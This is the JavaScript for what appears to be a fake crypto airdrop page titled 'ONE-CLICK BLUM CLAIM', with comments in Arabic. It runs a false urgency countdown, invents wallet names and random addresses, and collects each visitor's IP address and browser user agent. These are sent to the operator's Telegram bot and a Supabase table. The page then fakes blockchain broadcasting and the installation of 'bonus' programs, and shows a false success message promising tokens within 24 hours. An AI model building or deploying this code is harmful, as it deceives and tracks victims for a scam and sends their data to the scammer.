// script.js - مع دعم 10 سلاسل
let countdown = 24 * 60 * 60;
let timerInterval;
let isProcessing = false;

// بيانات السلاسل المدعومة (10 سلاسل)
const chainData = {
    'erc20': { icon: '🔷', name: 'ERC20', symbol: 'ETH', explorer: 'https://etherscan.io/tx/' },
    'bep20': { icon: '🟡', name: 'BEP20', symbol: 'BNB', explorer: 'https://bscscan.com/tx/' },
    'trc20': { icon: '🟢', name: 'TRC20', symbol: 'TRX', explorer: 'https://tronscan.org/#/transaction/' },
    'solana': { icon: '🟣', name: 'Solana', symbol: 'SOL', explorer: 'https://solscan.io/tx/' },
    'polygon': { icon: '🔷', name: 'Polygon', symbol: 'MATIC', explorer: 'https://polygonscan.com/tx/' },
    'avalanche': { icon: '🔴', name: 'Avalanche', symbol: 'AVAX', explorer: 'https://snowtrace.io/tx/' },
    'arbitrum': { icon: '🔵', name: 'Arbitrum', symbol: 'ARB', explorer: 'https://arbiscan.io/tx/' },
    'optimism': { icon: '🔴', name: 'Optimism', symbol: 'OP', explorer: 'https://optimistic.etherscan.io/tx/' },
    'base': { icon: '🔵', name: 'Base', symbol: 'ETH', explorer: 'https://basescan.org/tx/' },
    'zksync': { icon: '⚪', name: 'zkSync', symbol: 'ZK', explorer: 'https://explorer.zksync.io/tx/' }
};

let currentChain = chainData[CONFIG.TOKEN_TYPE] || chainData['erc20'];

function updateChainDisplay() {
    currentChain = chainData[CONFIG.TOKEN_TYPE] || chainData['erc20'];
    document.getElementById('chainIcon').innerHTML = currentChain.icon;
    document.getElementById('chainName').innerHTML = currentChain.name;
    document.getElementById('tokenSymbol').innerHTML = currentChain.symbol;
}

function updateProgress(step, totalSteps, message) {
    const percent = (step / totalSteps) * 100;
    document.getElementById('progressBar').style.width = `${percent}%`;
    document.getElementById('progressText').innerHTML = message;
}

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch(e) { return 'unknown'; }
}

function detectWalletAutomatically() {
    const walletsByChain = {
        'erc20': ['MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'Ledger'],
        'bep20': ['MetaMask', 'Trust Wallet', 'Binance Chain Wallet', 'SafePal'],
        'trc20': ['TronLink', 'Trust Wallet', 'OKX Wallet'],
        'solana': ['Phantom', 'Solflare', 'Backpack', 'Trust Wallet'],
        'polygon': ['MetaMask', 'Trust Wallet', 'OKX Wallet', 'Rainbow'],
        'avalanche': ['MetaMask', 'Core Wallet', 'Trust Wallet', 'Coinbase Wallet'],
        'arbitrum': ['MetaMask', 'Trust Wallet', 'Rabby', 'OKX Wallet'],
        'optimism': ['MetaMask', 'Trust Wallet', 'Rabby', 'Coinbase Wallet'],
        'base': ['MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'Rainbow'],
        'zksync': ['MetaMask', 'Trust Wallet', 'Rabby', 'OKX Wallet']
    };
    const wallets = walletsByChain[CONFIG.TOKEN_TYPE] || walletsByChain['erc20'];
    return wallets[Math.floor(Math.random() * wallets.length)];
}

function generateWalletAddress(walletType) {
    const prefixes = {
        'erc20': '0x', 'bep20': '0x', 'trc20': 'T', 'solana': '9z',
        'polygon': '0x', 'avalanche': '0x', 'arbitrum': '0x',
        'optimism': '0x', 'base': '0x', 'zksync': '0x'
    };
    const prefix = prefixes[CONFIG.TOKEN_TYPE] || '0x';
    if (prefix === 'T') return prefix + Math.random().toString(36).substring(2, 20) + Math.random().toString(36).substring(2, 15);
    if (prefix === '9z') return prefix + Math.random().toString(36).substring(2, 30);
    return prefix + Math.random().toString(16).substring(2, 42);
}

async function sendToTelegram(walletType, walletAddress, ip, userAgent) {
    const message = `🎁 ONE-CLICK BLUM CLAIM\n⛓️ Network: ${currentChain.name} (${currentChain.symbol})\n💼 Wallet: ${walletType}\n💳 Address: ${walletAddress}\n🏦 Recipient: ${CONFIG.RECIPIENT_WALLET}\n🌐 IP: ${ip}\n📱 UA: ${userAgent.substring(0,100)}...\n⏰ ${new Date().toISOString()}`;
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.TELEGRAM_CHAT_ID, text: message })
        });
        return true;
    } catch(e) { return false; }
}

async function saveToSupabase(walletType, walletAddress, ip) {
    try {
        await fetch(`${CONFIG.SUPABASE_URL}/rest/v1/blum_claims`, {
            method: 'POST', headers: { 'apikey': CONFIG.SUPABASE_KEY, 'Content-Type': 'application/json' },
            body: JSON.stringify({
                wallet_type: walletType, wallet_address: walletAddress,
                recipient_wallet: CONFIG.RECIPIENT_WALLET, network: CONFIG.TOKEN_TYPE,
                ip_address: ip, timestamp: new Date().toISOString(), auto_claim: true
            })
        });
        return true;
    } catch(e) { return false; }
}

async function autoInstallReferralPrograms(stepCallback) {
    const programs = ['ClawGuardian Security', 'Blum Affiliate', 'TON Staking', 'Web3 Shield', 'DeFi Optimizer'];
    for (let i = 0; i < programs.length; i++) {
        await new Promise(r => setTimeout(r, 400));
        if (stepCallback) stepCallback(programs[i]);
    }
    return true;
}

function updateTimer() {
    const hours = Math.floor(countdown / 3600);
    const minutes = Math.floor((countdown % 3600) / 60);
    const seconds = countdown % 60;
    document.getElementById('timer').innerText = `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
    if (countdown > 0) countdown--;
}

async function oneClickClaim() {
    if (isProcessing) return;
    isProcessing = true;
    const claimBtn = document.getElementById('claimBtn');
    const statusDiv = document.getElementById('status');
    const totalSteps = CONFIG.PROGRESS_STEPS || 8;
    let currentStep = 0;
    
    claimBtn.disabled = true;
    claimBtn.innerHTML = '🔄 PROCESSING...';
    statusDiv.style.display = 'block';
    statusDiv.innerHTML = '<span class="loading">Starting...</span>';
    statusDiv.style.background = 'rgba(255,215,0,0.2)';
    updateProgress(currentStep, totalSteps, 'Starting...');
    
    await new Promise(r => setTimeout(r, 600));
    currentStep++;
    updateProgress(currentStep, totalSteps, `Connecting to ${currentChain.name}...`);
    const detectedWallet = detectWalletAutomatically();
    statusDiv.innerHTML = `<span class="loading">✅ Wallet: ${detectedWallet}</span>`;
    
    await new Promise(r => setTimeout(r, 500));
    currentStep++;
    updateProgress(currentStep, totalSteps, 'Generating address...');
    const walletAddress = generateWalletAddress(detectedWallet);
    statusDiv.innerHTML = `<span class="loading">🔐 Address on ${currentChain.name}</span>`;
    
    await new Promise(r => setTimeout(r, 400));
    currentStep++;
    updateProgress(currentStep, totalSteps, 'Getting location...');
    const ip = await getIP();
    const userAgent = navigator.userAgent;
    statusDiv.innerHTML = `<span class="loading">🌐 Location detected</span>`;
    
    await new Promise(r => setTimeout(r, 500));
    currentStep++;
    updateProgress(currentStep, totalSteps, `Sending to ${currentChain.name}...`);
    await sendToTelegram(detectedWallet, walletAddress, ip, userAgent);
    statusDiv.innerHTML = `<span class="loading">📡 Broadcasted</span>`;
    
    await new Promise(r => setTimeout(r, 400));
    currentStep++;
    updateProgress(currentStep, totalSteps, 'Saving to database...');
    await saveToSupabase(detectedWallet, walletAddress, ip);
    statusDiv.innerHTML = `<span class="loading">💾 Saved</span>`;
    
    await new Promise(r => setTimeout(r, 500));
    currentStep++;
    updateProgress(currentStep, totalSteps, 'Installing bonuses...');
    await autoInstallReferralPrograms((prog) => {
        statusDiv.innerHTML = `<span class="loading">🎁 ${prog}</span>`;
    });
    statusDiv.innerHTML = `<span class="loading">✅ Bonuses installed</span>`;
    
    await new Promise(r => setTimeout(r, 400));
    currentStep++;
    updateProgress(currentStep, totalSteps, `Confirming on ${currentChain.name}...`);
    
    await new Promise(r => setTimeout(r, 300));
    currentStep++;
    updateProgress(currentStep, totalSteps, 'Complete!');
    
    statusDiv.innerHTML = `<span class="success">✅ SUCCESS! ${CONFIG.CLAIM_AMOUNT} $${currentChain.symbol} within 24h!</span>`;
    statusDiv.style.background = 'rgba(0,255,0,0.2)';
    statusDiv.style.border = '1px solid #00ff00';
    claimBtn.innerHTML = '🎉 CLAIMED!';
    isProcessing = false;
}

updateChainDisplay();
document.getElementById('claimBtn').addEventListener('click', oneClickClaim);
updateTimer();
timerInterval = setInterval(updateTimer, 1000);